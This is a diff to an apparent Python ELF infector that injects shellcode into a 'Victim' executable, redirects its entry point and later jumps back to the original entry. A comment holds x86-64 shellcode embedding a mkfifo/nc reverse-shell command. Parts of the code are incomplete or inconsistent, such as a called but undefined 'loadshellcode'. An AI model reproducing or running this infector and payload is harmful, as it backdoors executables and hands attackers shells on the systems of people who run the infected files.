@@ -15,7 +15,7 @@ p.add_argument("--pie", default="1")
 args = p.parse_args()
 
 class Victim:
-	def __init__(self, file="a.out"):
+	def __init__(self, file="a.out", shellcodef=None):
 		self.file = self.data = self.shellcode = self.shellcodelen = self.eentry = self.exeend = self.injectionoffset = self.disp = False
 		self.file = file
 		with open(self.file, "rb") as f:
@@ -57,7 +57,7 @@ class Victim:
 			self.injectionoffset = self.exeend - self.shellcodelen
 		except:
 			print("no")
-	def modshellcode(self, signal=[0x78, 0x56, 0x34, 0x12], eentry=None, disp=None):
+	def modshellcodejmpeentry(self, signal=[0x78, 0x56, 0x34, 0x12], eentry=None, disp=None):
 		signal = bytearray(signal)
 		if not eentry:
 			eentry = self.eentry
@@ -77,6 +77,8 @@ class Victim:
 			self.shellcode[i:i+4] = self.offset
 		else:
 			raise Exception("pattern not found")
+	def modshellcodepython(self, signal=[0x44, 0x33, 0x22, 0x11]):
+		pass
 	def insert(self, idx=None):
 		if not idx:
 			idx = self.injectionoffset
@@ -99,24 +101,33 @@ class Victim:
 			data = self.data
 		with open(self.file, "wb") as f:
 			f.write(data)
-	def __call__(self):
+	def __call__(self, verbose=False):
 		self.geteentry()
 		self.findinjectionoffset()
-		self.modshellcode()
+		self.modshellcodejmpeentry()
 		self.insert()
 		self.changeeentry()
 		self.writein()
-		print("default done")
+		if verbose:
+			print("default done")
 	default = __call__
 class Binary:
 	def __init__(self, file="sh"):
 		with open(file, "rb") as f:
-			self.shellcode = f.read()
+			self.code = f.read()
 		self.file = file
+	shellcodestart = b'\xe8\x00\x00\x00\x00[\xeb^/bin/sh' # b'\xe8\x00\x00\x00\x00[\xeb^/bin/sh\x00-c\x00echo REVSH;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f\x00H\x83\xeb\x05WVRH\x83\xec\x08\xb89\x00\x00\x00\x0f\x05H\x83\xf8\x00t\x02\xeb?\xe8J\x00\x00\x00j\x00H\x8dC\x13PH\x8dC\x10PH\x8dC\x08P\xb8;\x00\x00\x00H\x8d{\x08H\x8d4$\xba\x00\x00\x00\x00\x0f\x05\xe8 \x00\x00\x00H\x83\xc4 \xb8<\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05H\x83\xc4\x08Z^_H\x8d\x83xV4\x12\xff\xe0\xc3PH\x8d\x03\xff\xd0X\xc3'
+	shellcodeend = b'\x12\x34\x56\x78'
+	def getshellcode(self):
+		self.shellcodestartidx = self.code.find(self.shellcodestart)
+		self.shellcodeendidx = self.code.find(self.shellcodeend) + len(self.shellcodeend) + 1
+		self.shellcode = self.code[self.shellcodestartidx:self.shellcodeendidx]
 	def __call__(self, file="a.out"):
 		binary = Victim(file)
 		binary.shellcode = self.shellcode
-binary = File(file="a.out")
+		binary("verbose")
+binary = Victim(file="a.out")
+binary.loadshellcode(args.shellcode)
 
 if args.d:
 	default()
